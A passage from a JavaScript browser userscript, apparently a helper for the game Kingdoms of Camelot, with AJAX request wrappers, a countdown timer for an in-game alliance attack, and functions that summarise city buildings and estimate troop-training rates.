              if(matTypeof(opts.parameters[k]) == 'object'){
                  for(var h in opts.parameters[k]){
                      if(matTypeof(opts.parameters[k][h]) == 'object'){
                          for(var i in opts.parameters[k][h]){
                              if(matTypeof(opts.parameters[k][h][i]) == 'object'){
                              for(var j in opts.parameters[k][h][i]){
                                  a.push (k+'['+h+']['+i+']['+j+'] ='+ opts.parameters[k][h][i][j] );
                              }
                              } else
                              	a.push (k+'['+h+']['+i+']'+' ='+ opts.parameters[k][h][i]);
                          }
                      } else
                      a.push (k+'['+h+'] ='+ opts.parameters[k][h] );
                  }
              } else
              a.push (k +'='+ opts.parameters[k] );
        }
        ajax.send (a.join ('&'));
    } else {
        ajax.send();
    }
}
function onUnload (){
  Options.pbWinPos = mainPop.getLocation();
  if (!ResetAll) saveOptions();
  if (!ResetColors) saveColors();
  if (!ResetStyleOptions) saveStyleOptions();
}
function mouseMainTab (me){   // right-click on main button resets window location
  if (me.button == 2){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    mainPop.setLocation ({x: c.x+4, y: c.y+c.height});
  }
}
function eventHideShow (){
  if (mainPop.toggleHide(mainPop)){
    tabManager.showTab();
    Options.pbWinIsOpen = true;
  } else {
    tabManager.hideTab();
    Options.pbWinIsOpen = false;
  }
  saveOptions();
}
function hideMe (){
  mainPop.show (false);
  tabManager.hideTab();
  Options.pbWinIsOpen = false;
  saveOptions();
}
function showMe (){
  mainPop.show (true);
  tabManager.showTab();
  Options.pbWinIsOpen = true;
  saveOptions();
}
function addMyFunction (func){      // add function to run in our own scope
  unsafeWindow[func.name] = func;
}
function addUwFunction (func){      // add function to run in unsafeWindow's scope
  var scr = document.createElement('script');
  scr.innerHTML = func.toString();
  document.body.appendChild(scr);
}
function alterUwFunction (funcName, frArray){
  try {
    funcText = unsafeWindow[funcName].toString();
    rt = funcText.replace ('function '+funcName, 'function');
    for (i=0; i<frArray.length; i++){
      x = rt.replace(frArray[i][0], frArray[i][1]);
      if (x == rt)
        return false;
      rt = x;
    }
    js = funcName +' = '+ rt;
    var scr=document.createElement('script');
    scr.innerHTML=js;
    document.body.appendChild(scr);
    return true;
  } catch (err) {
    return false;
  }
}
function officerId2String (oid){
  if (oid==null)
    return '';
  else if (oid==3) 	
    return uW.allianceOfficerTypeMapping[3];
  else if (oid==2)
    return uW.allianceOfficerTypeMapping[2];
  else if (oid==1)
    return uW.allianceOfficerTypeMapping[1];
    else if (oid==4)
    return uW.allianceOfficerTypeMapping[4];
  return '';
}
// PDXCountdown
/* Hier das genaue Ende des Countdown angeben */
if (PDXCountOpt.enableC1) {
var PDXC1Endjahr = PDXCountOpt.C1EndYear; //2020;  // Jahr   (2004-ue.)
var PDXC1Endmonat = PDXCountOpt.C1EndMonth; //5;    // Monat  (1-12)
var PDXC1Endtag = PDXCountOpt.C1EndDay; // 15;     // Tag    (1-31)
var PDXC1Endstunde = PDXCountOpt.C1EndHour; //18;  // Stunde (0-23)
var PDXC1Endminute = PDXCountOpt.C1EndMin; //8;   // Minute (0-59)
var PDXC1Endsekunde = PDXCountOpt.C1EndSec; // 50 Sekunde(0-59)
var PDXC1ENDE="Angriff auf die Allianz[NAME] - Ziel 1([PLAYER]): XXX,yyy | Ziel 2([PLAYER]): XXX,yyy | Ziel 3([PLAYER]): XXX,yyy";  //Anzeige, wenn countdown beendet ist (unbedingt in anf?hrungszeichen)

var PDXC1rechnen=0;
var PDXC1Jahr=31536000000;
var PDXC1Monat=PDXC1Jahr/12;
var PDXC1Tag=PDXC1Jahr/365;
var PDXC1Stunden=PDXC1Tag/24;
var PDXC1Minuten=PDXC1Stunden/60;
var PDXC1Sekunden=PDXC1Minuten/60;
var PDXC1Jahr1;
var PDXC1Monat1;
var PDXC1Tag1;
var PDXC1Stunden1;
var PDXC1Minuten1;
var PDXC1Sekunden1;
var i;
var PDXC1NIX=new Array();
var PDXC1Anfang=new Date();
var PDXC1Ende=new Date();

PDXC1Ende.setYear(PDXC1Endjahr)
PDXC1Ende.setMonth(PDXC1Endmonat)
PDXC1Ende.setDate(PDXC1Endtag)
PDXC1Ende.setHours(PDXC1Endstunde)
PDXC1Ende.setMinutes(PDXC1Endminute)
PDXC1Ende.setSeconds(PDXC1Endsekunde)

function PDXC1countdown()
{
	PDXC1NIX[0]=0;
	PDXC1NIX[1]=0;
	PDXC1NIX[2]=0;

	var PDXC1Anfang=new Date();
	PDXC1Anfang.getYear();
	PDXC1Anfang.getMonth();
	PDXC1Anfang.getDate();
	PDXC1Anfang.getHours();
	PDXC1Anfang.getMinutes();
	PDXC1Anfang.getSeconds();
	PDXC1rechnen=PDXC1Ende-PDXC1Anfang;

	if(!(PDXC1rechnen<=0))
	{
		if(PDXC1rechnen<32000)
		{
			i=parseInt(PDXC1rechnen/1000);
			i<10?PDXC1NIX[3]='0':PDXC1NIX[3]='';
			document.datum.DD.value='00:00:'+PDXC1NIX[3]+i;
		} else {
			PDXC1Jahr1=parseInt(PDXC1rechnen/PDXC1Jahr);
			PDXC1rechnen=PDXC1rechnen-PDXC1Jahr1*PDXC1Jahr;
			PDXC1Monat1=parseInt(PDXC1rechnen/PDXC1Monat);
			PDXC1rechnen=PDXC1rechnen-PDXC1Monat1*PDXC1Monat;
			PDXC1Tag1=parseInt(PDXC1rechnen/PDXC1Tag);
			PDXC1rechnen=PDXC1rechnen-PDXC1Tag1*PDXC1Tag;
			PDXC1Stunden1=parseInt(PDXC1rechnen/PDXC1Stunden);
			PDXC1rechnen=PDXC1rechnen-PDXC1Stunden1*PDXC1Stunden;
			PDXC1Minuten1=parseInt(PDXC1rechnen/PDXC1Minuten);
			PDXC1rechnen=PDXC1rechnen-PDXC1Minuten1*PDXC1Minuten;
			PDXC1Sekunden1=parseInt(PDXC1rechnen/PDXC1Sekunden);
			PDXC1Jahr1==0?PDXC1Jahr1='':PDXC1Jahr1='Jahre:'+ PDXC1Jahr1+' ';
			PDXC1Monat1==0?PDXC1Monat1='':PDXC1Monat1='Monate:'+ PDXC1Monat1+' ';
			PDXC1Tag1==0?PDXC1Tag1='':PDXC1Tag1='Tage:'+ PDXC1Tag1+' ';

			PDXC1Stunden1>9?PDXC1NIX[0]='':PDXC1NIX[0]=0;
			PDXC1Minuten1>9?PDXC1NIX[1]='':PDXC1NIX[1]=0;
			PDXC1Sekunden1>9?PDXC1NIX[2]='':PDXC1NIX[2]=0;

			if (PDXC1Ende-PDXC1Anfang < 0) {
				document.datum.DD.value=PDXC1ENDE;
			} else {
				document.datum.DD.value = PDXC1Jahr1 + '' + PDXC1Monat1 + '' + PDXC1Tag1 + '' + PDXC1NIX[0] + '' + PDXC1Stunden1 + ':' + PDXC1NIX[1] + '' + PDXC1Minuten1 + ':' + PDXC1NIX[2] + '' + PDXC1Sekunden1;
			}
		}
	} else {
		clearInterval(ID);
		document.datum.DD.value=PDXC1ENDE;
	}
}
var ID=setInterval('PDXC1countdown()',1);
};
var fortNamesShort = {
  53: ""+culang.crossbows+"",
  55: ""+culang.trebuchet+"",
  60: ""+culang.shrtrap+"",
  61: ""+culang.caltr+"",
  62: ""+culang.spiked+"",
}
function AjaxRequest (url, opts){
  var headers = {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Prototype-Version': '1.6.1',
    'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
  };
  var ajax = null;

if (DEBUG_TRACE_AJAX) logit ("AJAX: "+ url +"\n" + inspect (opts, 3, 1));

  if (window.XMLHttpRequest)
    ajax=new XMLHttpRequest();
  else
    ajax=new ActiveXObject("Microsoft.XMLHTTP");

  if (opts.method==null || opts.method=='')
    method = 'GET';
  else
    method = opts.method.toUpperCase();

  if (method == 'POST'){
    headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
  } else if (method == 'GET'){
    addUrlArgs (url, opts.parameters);
  }

  ajax.onreadystatechange = function(){ //  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
    if (ajax.readyState==4) {
      if (ajax.status >= 200 && ajax.status < 305)
        if (opts.onSuccess) opts.onSuccess(ajax);
      else
        if (opts.onFailure) opts.onFailure(ajax);
    } else {
      if (opts.onChange) opts.onChange (ajax);
    }
  }

  ajax.open(method, url, true);   // always async!

  for (var k in headers)
    ajax.setRequestHeader (k, headers[k]);
  if (matTypeof(opts.requestHeaders)=='object')
    for (var k in opts.requestHeaders)
      ajax.setRequestHeader (k, opts.requestHeaders[k]);

  if (method == 'POST'){
    var a = [];
    for (k in opts.parameters)
      a.push (k +'='+ opts.parameters[k] );
    ajax.send (a.join ('&'));
  } else               {
    ajax.send();
  }
}

function MyAjaxRequest (url, o, noRetry){
if (DEBUG_TRACE) logit (" 0 myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  var opts = unsafeWindow.Object.clone(o);
  var wasSuccess = o.onSuccess;
  var wasFailure = o.onFailure;
  var retry = 0;
  var delay = 5;
  var noRetry = noRetry===true?true:false;
  opts.onSuccess = mySuccess;
  opts.onFailure = myFailure;

if (DEBUG_TRACE) logit (" 1a myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  new AjaxRequest(url, opts);
  return;

  function myRetry(){
    ++retry;
    new AjaxRequest(url, opts);
    delay = delay * 1.25;
  }

  function myFailure(){
    var o = {};
if (DEBUG_TRACE) logit ("myAjaxRequest.myFailure(): "+ inspect(rslt, 1, 1));
    o.ok = false;
    o.errorMsg = "AJAX Communication Failure";
    wasFailure (o);
  }

  function mySuccess (msg){
    var rslt = eval("(" + msg.responseText + ")");
    var x;
    if (rslt.ok){
if (DEBUG_TRACE) logit (" 1b myAjaxRequest.mySuccess(): "+ inspect(rslt, 1, 1));
      rslt.errorMsg = null;   ///// !!!!!!!!!!!!!  ************
      if (rslt.updateSeed)
        unsafeWindow.update_seed(rslt.updateSeed);
      wasSuccess (rslt);
      return;
    }
if (DEBUG_TRACE) logit (" 1b myAjaxRequest.mySuccess() !ok : "+ inspect(rslt, 3, 1));
    rslt.errorMsg = unsafeWindow.printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null));
    if ( (x = rslt.errorMsg.indexOf ('<br><br>')) > 0)
      rslt.errorMsg = rslt.errorMsg.substr (0, x-1);
    if (!noRetry && (rslt.error_code==0 ||rslt.error_code==8 || rslt.error_code==1 || rslt.error_code==3)){
	  dialogRetry (rslt.errorMsg, delay, function(){myRetry()}, function(){wasSuccess (rslt)}, rslt.error_code);
    } else {
      wasSuccess (rslt);
    }
  }
}



function getMyUserId (){
	return parseInt([Seed.tutorial.userId]);
}
function getMyAlliance (){
  if (Seed.allianceDiplomacies==null || Seed.allianceDiplomacies.allianceName==null)
    return [0, ''+culang.none+''];
  else
    return [Seed.allianceDiplomacies.allianceId, Seed.allianceDiplomacies.allianceName];
}
function getDiplomacy (aid) {
	  if(aid < 1 || aid == null)
		return ''+culang.noally+'';
	  if (Seed.allianceDiplomacies == null)
		return ''+culang.neutral+'';
	  if (Seed.allianceDiplomacies.friendly && Seed.allianceDiplomacies.friendly['a'+aid] != null)
		return ''+culang.friendly+'';
	  if (Seed.allianceDiplomacies.hostile && Seed.allianceDiplomacies.hostile['a'+aid] != null)
		return ''+culang.hostile+'';
	  if(getMyAlliance()[0] == aid)
		return ''+culang.ally+'';
	  return ''+culang.neutral+'';
	};

function getCityBuilding (cityId, buildingId){
  var b = Seed.buildings['city'+cityId];
  var ret = {count:0, maxLevel:0};
  for (var i=1; i<33; i++){
    if (b['pos'+i] && b['pos'+i][0] == buildingId){
      ++ret.count;
      if (parseInt(b['pos'+i][1]) > ret.maxLevel)
        ret.maxLevel = parseInt(b['pos'+i][1]);
    }
  }
  return ret;
}

function highlightLowBuilding (noBuildings, buildingLevel, buildingPrefix){
  var ret = '';
  if (buildingLevel<9)
    ret += '<SPAN class=boldRed>';
  if (noBuildings>1)
    ret += noBuildings + ' x ';
  if (buildingPrefix)
    ret += buildingPrefix;
  ret += ''+culang.lvl+' ' + buildingLevel;
  if (buildingLevel<9)
    ret += '</SPAN>';
  return ret;
}
function getAllCityBuildings (cityID){
  var b = Seed.buildings[cityID];
  var castleLevel = parseInt(b['pos0'][1]);
  var noFields = 10 + 3 * castleLevel;
  if (castleLevel==11)
    noFields = 40;
  sumCastle = highlightLowBuilding(1,castleLevel);
  sumCottage = '';
  sumTavern = '';
  sumKnightsHall = '';
  sumEmbassy = '';
  sumStorehouse = '';
  sumMarket = '';
  sumAlchemyLab = '';
  sumRallyPoint = '';
  sumBarracks = '';
  sumWatchTower = '';
  sumBlacksmith = '';
  sumWorkshop = '';
  sumStable = '';
  sumReliefStation = '';
  sumWall = '';
  sumGuardian = '';
  sumInside = 0;
  sumFarm = '';
  sumSawmill = '';
  sumQuarry = '';
  sumMine = '';
  sumOutside = 0;
  arrCottage = [];
  arrBarracks = [];
  arrFarm = [];
  arrSawmill = [];
  arrQuarry = [];
  arrMine = [];
  for (var i=1; i<12; i++){
    arrCottage[i]=0;
    arrBarracks[i]=0;
    arrFarm[i]=0;
    arrSawmill[i]=0;
    arrQuarry[i]=0;
    arrMine[i]=0;
  }

  for (var i=1; i<33; i++){
    if (b['pos'+i]) {
      bname = b['pos'+i][0];
      blvl  = b['pos'+i][1];
      if (bname==5)  arrCottage[blvl]++;
      if (bname==6)  sumTavern        = highlightLowBuilding(1,blvl);
      if (bname==7)  sumKnightsHall   = highlightLowBuilding(1,blvl);
      if (bname==8)  sumEmbassy       = highlightLowBuilding(1,blvl);
      if (bname==9)  sumStorehouse    = highlightLowBuilding(1,blvl);
      if (bname==10) sumMarket        = highlightLowBuilding(1,blvl);
      if (bname==11) sumAlchemyLab    = highlightLowBuilding(1,blvl);
      if (bname==12) sumRallyPoint    = highlightLowBuilding(1,blvl);
      if (bname==13) arrBarracks[blvl]++;
      if (bname==14) sumWatchTower    = highlightLowBuilding(1,blvl);
      if (bname==15) sumBlacksmith    = highlightLowBuilding(1,blvl);
      if (bname==16) sumWorkshop      = highlightLowBuilding(1,blvl);
      if (bname==17) sumStable        = highlightLowBuilding(1,blvl);
      if (bname==18) sumReliefStation = highlightLowBuilding(1,blvl);
      if (bname==19) sumWall          = highlightLowBuilding(1,blvl);
    }
    else
      sumInside += 1;
  }
  for (var i=100; i<100+noFields; i++){
    if (b['pos'+i]) {
      bname = b['pos'+i][0];
      blvl  = b['pos'+i][1];
      if (bname==1) arrFarm[blvl]++;
      if (bname==2) arrSawmill[blvl]++;
      if (bname==3) arrQuarry[blvl]++;
      if (bname==4) arrMine[blvl]++;
    }
    else
      sumOutside += 1;
  }
  for (var i=1; i<12; i++){
    if(arrCottage[i]>0)  sumCottage+=highlightLowBuilding(arrCottage[i],i)+'<BR>';
    if(arrBarracks[i]>0) sumBarracks+=highlightLowBuilding(arrBarracks[i],i)+'<BR>';
    if(arrFarm[i]>0)     sumFarm+=highlightLowBuilding(arrFarm[i],i)+'<BR>';
    if(arrSawmill[i]>0)  sumSawmill+=highlightLowBuilding(arrSawmill[i],i)+'<BR>';
    if(arrQuarry[i]>0)   sumQuarry+=highlightLowBuilding(arrQuarry[i],i)+'<BR>';
    if(arrMine[i]>0)     sumMine+=highlightLowBuilding(arrMine[i],i)+'<BR>';
  }
  if (sumCottage.length>0)  sumCottage=sumCottage.substring (0,sumCottage.length-4);
  if (sumBarracks.length>0) sumBarracks=sumBarracks.substring (0,sumBarracks.length-4);
  if (sumFarm.length>0)     sumFarm=sumFarm.substring (0,sumFarm.length-4);
  if (sumSawmill.length>0)  sumSawmill=sumSawmill.substring (0,sumSawmill.length-4);
  if (sumQuarry.length>0)   sumQuarry=sumQuarry.substring (0,sumQuarry.length-4);
  if (sumMine.length>0)     sumMine=sumMine.substring (0,sumMine.length-4);
  if (b['pos500']) {
    blvl  = b['pos500'][1];
    bname = unsafeWindow.buildingcost['bdg' + b['pos500'][0]][0];
    bname = bname.substr(0,bname.length-8);
    sumGuardian = highlightLowBuilding(1,blvl,bname);
  }
  else
    sumInside += 1;
  if (sumInside==0)
    sumInside='<span class=boldGreen>'+culang.builddone+'</span>';
  else
    sumInside='<SPAN class=boldRed>'+culang.free+': '+sumInside+'</SPAN>';
  if (sumOutside==0)
    sumOutside='<span class=boldGreen>'+culang.builddone+'</span>';
  else
    sumOutside='<SPAN class=boldRed>'+culang.free+': '+sumOutside+'</SPAN>';
}

function getTroopTrainEstimates (cityID){

  var b = Seed.buildings[cityID];
  numBarracks = 0;
  maxBarracks = 0;
  totLevelsBarracks = 0;
  blacksmithLevel = 0;
  stableLevel = 0;
  workshopLevel = 0;
  for (var j=1; j<33; j++){
    if (b['pos'+j]) {
      var bname = parseInt(b['pos'+j][0]);
      var blvl = parseInt(b['pos'+j][1]);
      if (bname==13) {
        numBarracks++;
        totLevelsBarracks += parseInt(blvl);
        if (blvl>maxBarracks) maxBarracks=blvl;
      }
      if (bname==15)
        blacksmithLevel = blvl;
      if (bname==17)
        stableLevel = blvl;
      if (bname==16)
        workshopLevel = blvl;
    }
  }

  var now = unixTime();
  marshallCombatScore = 0;
  var s = Seed.knights[cityID];
  if (s) {
    s = s["knt" + Seed.leaders[cityID].combatKnightId];
    if (s){
      marshallCombatScore = s.combat;
      if (s.combatBoostExpireUnixtime > now)
        marshallCombatScore *= 1.25;
    }
  }

  geometryLevel            = parseInt(Seed.tech["tch5"]);
  eagleEyesLevel           = parseInt(Seed.tech["tch6"]);
  poisonedEdgeLevel        = parseInt(Seed.tech["tch8"]);
  metalAlloysLevel         = parseInt(Seed.tech["tch9"]);
  featherweightPowderLevel = parseInt(Seed.tech["tch10"]);
  alloyHorseshoesLevel     = parseInt(Seed.tech["tch12"]);
  fletchingLevel           = parseInt(Seed.tech["tch13"]);

  var bm = numBarracks + 0.1 * (totLevelsBarracks - numBarracks);
  var mf = marshallCombatScore / 200;
  var gf = geometryLevel/10;
  var sf = stableLevel/10;
  var wf = workshopLevel/10;
  var isf = bm * (1 + mf + gf);
  var csf = bm * (1 + mf + gf + sf);
  var ssf = bm * (1 + mf + gf + sf + wf);

  if (maxBarracks > 0) {
    rateSupplyTroop = 3600 * isf /   50;
    rateMilitiaman  = 3600 * isf /   25;
  } else {
    rateSupplyTroop = 0;
    rateMilitiaman  = 0;
  }
  if (maxBarracks > 1 && eagleEyesLevel > 0)
    rateScout = 3600 * isf /  100;
  else
    rateScout = 0;
  if (maxBarracks > 1 && poisonedEdgeLevel > 0)
    ratePikeman = 3600 * isf /  150;
  else
    ratePikeman = 0;
  if (maxBarracks > 2 && blacksmithLevel > 0 && metalAlloysLevel > 0)
    rateSwordsman = 3600 * isf /  225;
  else
    rateSwordsman = 0;
  if (maxBarracks > 3 && fletchingLevel > 0)
    rateArcher = 3600 * isf /  350;
  else
    rateArcher = 0;
  if (maxBarracks > 4 && stableLevel > 0 && alloyHorseshoesLevel > 0)
    rateCavalry = 3600 * csf /  500;
  else
    rateCavalry = 0;
  if (maxBarracks > 6 && blacksmithLevel > 4 && stableLevel > 4 && alloyHorseshoesLevel > 4)
    rateHeavyCavalry = 3600 * csf / 1500;
  else
    rateHeavyCavalry = 0;
  if (maxBarracks > 5 && stableLevel > 0 && workshopLevel > 2 && featherweightPowderLevel > 0)
    rateSupplyWagon  = 3600 * ssf / 1000;
  else
    rateSupplyWagon = 0;
  if (maxBarracks > 7 && stableLevel > 1 && workshopLevel > 4 && geometryLevel > 4 && fletchingLevel > 5)
    rateBallista = 3600 * ssf / 3000;
  else
    rateBallista = 0;
  if (maxBarracks > 8 && blacksmithLevel > 4 && stableLevel > 2 && workshopLevel > 6 && metalAlloysLevel > 7 && geometryLevel > 6)
    rateBatteringRam = 3600 * ssf / 4500;
  else
    rateBatteringRam = 0;
  if (maxBarracks > 9 && stableLevel > 1 && workshopLevel > 8 && geometryLevel > 9 && fletchingLevel > 9)
    rateCatapult = 3600 * ssf / 6000;
  else
    rateCatapult = 0;

}
function formatUnixTime (unixTimeString,format){
	var rtn = unsafeWindow.formatDateByUnixTime (unixTimeString);
/*if (format=='24hour') {
		if (rtn.substr(14,2)=='AM')
			rtn = rtn.substr(0,13);
		else
			rtn = rtn.substr(8,2)+' '+rtn.substr(0,8)+(parseInt(rtn.substr(8,2))+12)+rtn.substr(10,3);
	} */
	return rtn;
}
function getAllianceLeaders (){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetLeaders.php" + unsafeWindow.g_ajaxsuffix, {
		 method: "post",
		 parameters: params,
		 loading: true,
		 onSuccess: function (rslt) {
		 rslt = eval("(" + rslt.responseText + ")");
		 if (rslt.officers) {
			 Options.AllianceLeaders = [];
       for (add in rslt.officers) {
          Options.AllianceLeaders.push(rslt.officers[add]['userId']);
       }
     } 
     else {
			  setTimeout(function(){getAllianceLeaders;}, 1500);
		  }
		},
		onFailure: function () {}
  		});
};
function CdispCityPicker (id, span, dispName, notify, selbut){
  function CcityButHandler (t){
    var that = t;
    this.clickedCityBut = clickedCityBut;
    function clickedCityBut (e){
      if (that.selected != null)
        that.selected.className = "castleBut castleButNon";
      that.city = Cities.cities[e.target.id.substr(that.prefixLen)];
      if (that.dispName)
        document.getElementById(that.id+'cname').innerHTML = that.city.name;
      e.target.className = "castleBut castleButSel";
      that.selected = e.target;
      if (that.coordBoxX){
        that.coordBoxX.value = that.city.x;
        that.coordBoxY.value = that.city.y;
        var evt = document.createEvent("HTMLEvents");
        evt.initEvent('change', true, true ); // event type,bubbling,cancelable
        that.coordBoxX.dispatchEvent(evt);
        that.coordBoxY.dispatchEvent(evt);
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
      }
      if (that.notify != null)
        that.notify(that.city, that.city.x, that.city.y);
    }
  }
  function selectBut (idx){
    document.getElementById(this.id+'_'+idx).click();
  }
  function bindToXYboxes (eX, eY){
    function CboxHandler (t){
      var that = t;
      this.eventChange = eventChange;
      if (that.city){
        eX.value = that.city.x;
        eY.value = that.city.y;
      }
      function eventChange (){
      var xValue=that.coordBoxX.value.trim();
      var xI=/^\s*([0-9]+)[\s,]+([0-9]+)/.exec(xValue);
      if(xI) {
        that.coordBoxX.value=xI[1]
        that.coordBoxY.value=xI[2]
      }
        var x = parseInt(that.coordBoxX.value, 10);
        var y = parseInt(that.coordBoxY.value, 10);
        if (isNaN(x) || x<0 || x>750){
          that.coordBoxX.style.backgroundColor = '#ff8888';
          return;
        }
        if (isNaN(y) || y<0 || y>750){
          that.coordBoxY.style.backgroundColor = '#ff8888';
          return;
        }
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
        if (that.notify != null)
          that.notify (null, x, y);
      }
      return false;
    }
    this.coordBoxX = eX;
    this.coordBoxY = eY;
    var bh = new CboxHandler(this);
    eX.size=2;
    eX.maxLength=10;
    eY.size=2;
    eY.maxLength=3;
    eX.style.width='2em';
    eY.style.width='2em';
    eX.addEventListener('change', bh.eventChange, false);
    eY.addEventListener('change', bh.eventChange, false);
  }

  this.selectBut = selectBut;
  this.bindToXYboxes = bindToXYboxes;
  this.coordBoxX = null;
  this.coordBoxY = null;
  this.id = id;
  this.dispName = dispName;
  this.prefixLen = id.length+1;
  this.notify = notify;
  this.selected = null;
  this.city = null;
  var m = '';
  for (var i=0; i<Cities.cities.length; i++)
    m += '<INPUT class="castleBut castleButNon" id="'+ id +'_'+ i +'" value="'+ (i+1) +'" type=submit \>';
  if (dispName)
    m += ' &nbsp; <SPAN style="display:inline-block; width:85px; font-weight:bold;" id='+ id +'cname' +'></span>';
  span.innerHTML = m;
  var handler = new CcityButHandler(this);
  for (var i=0; i<Cities.cities.length; i++)
    document.getElementById (id+'_'+i).addEventListener('click', handler.clickedCityBut, false);
  if (selbut != null)
    this.selectBut(selbut);
};

function CdialogCancelContinue (msg, canNotify, contNotify, centerElement){
  var pop = new CPopup ('ptcancont', 0, 0, 746, 100, true, canNotify);
  if (centerElement)
    pop.centerMe(centerElement);
  else
    pop.centerMe(document.body);
  pop.getTopDiv().innerHTML = '<CENTER>KoC Power - Multilang </center>';
  pop.getMainDiv().innerHTML = '<TABLE class=pdxTab align=center style="height: 100%"><TR align=center height=90%><TD>'+ msg +'</td></tr>\
      <TR align=center><TD><INPUT id=ptcccancel type=submit value="'+culang.Hcancel+'" \> &nbsp; &nbsp; <INPUT id=ptcccontin type=submit value="CONTINUE" \></td></tr></table>';
  document.getElementById('ptcccancel').addEventListener ('click', function (){pop.show(false); if (canNotify) canNotify();}, false);
  document.getElementById('ptcccontin').addEventListener ('click', function (){pop.show(false); if (contNotify) contNotify();}, false);
  pop.show(true);
}
function getResearchLevels () {
	for (var t=1; t < 17; t++) {
		if (t != 7) {
			researchLevels[t] = {};
			researchLevels[t].Id = t;
			researchLevels[t].Name = unsafeWindow.techcost['tch'+t][0].replace (/&#39;/img, '\'');
			researchLevels[t].Level = parseInt(Seed.tech['tch'+t]);
			researchLevels[t].NextLevelETA = 0;
		}
	}
	var q;
	var now = unixTime();
	for(var i=0; i<Cities.numCities; i++) { // each city
		var cityID = 'city'+ Cities.cities[i].id;
		q = Seed.queue_tch[cityID];
		if (q[0] != undefined)
			researchLevels[parseInt(q[0][0])].NextLevelETA = parseInt(q[0][3]) - now;
	} //GM_log(inspect(researchLevels, 10, 1, false));
}
function getTroopDefTrainEstimates (cityID){
	var b = Seed.buildings[cityID];
	city.numBarracks = 0;
	city.maxBarracks = 0;
	city.totLevelsBarracks = 0;
	city.blacksmithLevel = 0;
	city.stableLevel = 0;
	city.workshopLevel = 0;
	city.wallLevel = 0;
	for (var j=1; j<33; j++){
		if (b['pos'+j]) {
			var bname = parseInt(b['pos'+j][0]);
			var blvl = parseInt(b['pos'+j][1]);
			if (bname==13) {
				city.numBarracks++;
				city.totLevelsBarracks += parseInt(blvl);
				if (blvl>city.maxBarracks) city.maxBarracks=blvl;
			}
			if (bname==15)
				city.blacksmithLevel = blvl;
			if (bname==16)
				city.workshopLevel = blvl;
			if (bname==17)
				city.stableLevel = blvl;
			if (bname==19)
				city.wallLevel = blvl;
		}
	}
	var now = unixTime();
	city.marshallCombatScore = 0;
	var s = Seed.knights[cityID];
	if (s) {
		s = s["knt" + Seed.leaders[cityID].combatKnightId];
		if (s){
			city.marshallCombatScore = s.combat;
			if (s.combatBoostExpireUnixtime > now)
				city.marshallCombatScore *= 1.25;
		}
	}
	city.foremanBasePoliticsScore = 0;
	var s = Seed.knights[cityID];
	if (s) {
		s = s["knt" + Seed.leaders[cityID].politicsKnightId];
		if (s)
			city.foremanBasePoliticsScore = s.basePolitics;
	}

	city.loggingLevel = parseInt(Seed.tech["tch2"]);
	city.geometryLevel = parseInt(Seed.tech["tch5"]);
	city.eagleEyesLevel = parseInt(Seed.tech["tch6"]);
	city.poisonedEdgeLevel = parseInt(Seed.tech["tch8"]);
	city.metalAlloysLevel = parseInt(Seed.tech["tch9"]);
	city.featherweightPowderLevel = parseInt(Seed.tech["tch10"]);
	city.alloyHorseshoesLevel = parseInt(Seed.tech["tch12"]);
	city.fletchingLevel = parseInt(Seed.tech["tch13"]);
	city.giantsStrengthLevel = parseInt(Seed.tech["tch16"]);

	var bm = city.numBarracks + 0.1 * (city.totLevelsBarracks - city.numBarracks);
	var mf = city.marshallCombatScore / 200;
	var gf = city.geometryLevel / 10;
	var sf = city.stableLevel / 10;
	var wf = city.workshopLevel / 10;
	var isf = bm * (1 + mf + gf);
	var csf = bm * (1 + mf + gf + sf);
	var ssf = bm * (1 + mf + gf + sf + wf);
	var pf = city.foremanBasePoliticsScore / 200;
	var gsf = city.giantsStrengthLevel / 10;
	var dsf = 1 + pf + gsf;

	
	city.Troop1Time = ((city.maxBarracks > 0)?(50/isf):0);
	city.Troop2Time = city.Troop1Time/2;
	city.Troop3Time = ((city.maxBarracks > 1 && city.eagleEyesLevel > 0)?(100/isf):0);
	city.Troop4Time = ((city.maxBarracks > 1 && city.poisonedEdgeLevel > 0)?(150/isf):0);
	city.Troop5Time = ((city.maxBarracks > 2 && city.blacksmithLevel > 0 && city.metalAlloysLevel > 0)?(225/isf):0);
	city.Troop6Time = ((city.maxBarracks > 3 && city.fletchingLevel > 0)?(350/isf):0);
	city.Troop7Time = ((city.maxBarracks > 4 && city.stableLevel > 0 && city.alloyHorseshoesLevel > 0)?(500/csf):0);
	city.Troop8Time = ((city.maxBarracks > 6 && city.blacksmithLevel > 4 && city.stableLevel > 4 && city.alloyHorseshoesLevel > 4)?(1500/csf):0);
	city.Troop9Time = ((city.maxBarracks > 5 && city.stableLevel > 0 && city.workshopLevel > 2 && city.featherweightPowderLevel > 0)?(1000/ssf):0);
	city.Troop10Time = ((city.maxBarracks > 7 && city.stableLevel > 1 && city.workshopLevel > 4 && city.geometryLevel > 4 && city.fletchingLevel > 5)?(3000/ssf):0);
	city.Troop11Time = ((city.maxBarracks > 8 && city.blacksmithLevel > 4 && city.stableLevel > 2 && city.workshopLevel > 6 && city.metalAlloysLevel > 7 && city.geometryLevel > 6)?(4500/ssf):0);
	city.Troop12Time = ((city.maxBarracks > 9 && city.stableLevel > 1 && city.workshopLevel > 8 && city.geometryLevel > 9 && city.fletchingLevel > 9)?(6000/ssf):0);
	city.Def53Time = ((city.wallLevel > 5 && city.blacksmithLevel > 5 && city.fletchingLevel > 4)?(180/dsf):0);
	city.Def55Time = ((city.wallLevel > 7 && city.blacksmithLevel > 7 && city.fletchingLevel > 6 && city.geometryLevel > 6)?(135/dsf):0);
	city.Def60Time = ((city.wallLevel > 3 && city.blacksmithLevel > 3 && city.poisonedEdgeLevel > 1)?(90/dsf):0);
	city.Def61Time = ((city.wallLevel > 0 && city.metalAlloysLevel > 0)?(30/dsf):0);
